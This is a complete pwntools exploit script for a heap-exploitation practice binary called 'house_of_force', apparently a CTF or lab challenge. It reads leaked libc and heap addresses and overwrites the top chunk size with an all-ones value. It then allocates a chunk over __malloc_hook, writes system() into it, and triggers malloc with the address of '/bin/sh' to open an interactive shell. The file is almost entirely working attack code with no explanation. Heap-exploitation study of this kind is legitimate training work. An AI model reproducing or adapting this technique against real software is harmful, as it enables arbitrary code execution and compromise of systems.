#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 64
gs = '''
continue
'''

elf = context.binary = ELF('./house_of_force')

libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again
rop = ROP(elf)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

# to leak the address of puts(), use it to resolve the libc load address
r.recvuntil(b"puts() @ ")
libc.address = int(r.recvline(), 16) - libc.sym.puts

# this leaks the heap start address
r.recvuntil(b"heap @ ")
heap = int(r.recvline(), 16)
r.recvuntil(b"> ")
r.timeout = 0.1

# select malloc option
def malloc(size, data):
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b":", f"{size}".encode())
    r.sendlineafter(b":", data)
    r.recvuntil(b"> ")

# calulate the wraparound distance between two addresses. A start and end address
def delta(x, y):
    return(0xffffffffffffffff - x) + y

malloc(24, b"A"*24 + p64(0xffffffffffffffff))
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
malloc(distance, "/bin/sh\0")
malloc(24, p64(libc.sym.system))
#cmd = heap + 0x30
cmd = next(libc.search(b"/bin/sh"))
malloc(cmd, "")


#============= interactive ================

r.interactive()
